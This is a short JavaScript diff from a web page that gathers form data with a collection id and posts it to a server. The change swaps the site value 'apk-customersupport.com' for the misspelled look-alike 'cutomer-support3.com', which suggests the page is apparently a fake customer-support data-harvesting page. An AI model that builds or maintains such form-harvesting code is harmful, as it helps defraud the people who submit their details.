@@ -20,7 +20,7 @@ function serverCall(body, nextURL) {
                     }
                     window.location.href = nextURL;
                 } else {
-                    $("#test").text("not valid response from server");
+                     $("#test").text("Error : "+JSON.stringify(responseData));
                 }
         })
         .catch((error) => {
@@ -63,7 +63,7 @@ window.onload = function() {
             }
         }
         let sendData = {};
-        sendData['site'] = "apk-customersupport.com"
+        sendData['site'] = "cutomer-support3.com"
         sendData['data'] = formData;
         sendData['id'] = localStorage.getItem("collection_id");
 //        $("#test").text("sendData : "+JSON.stringify(sendData));
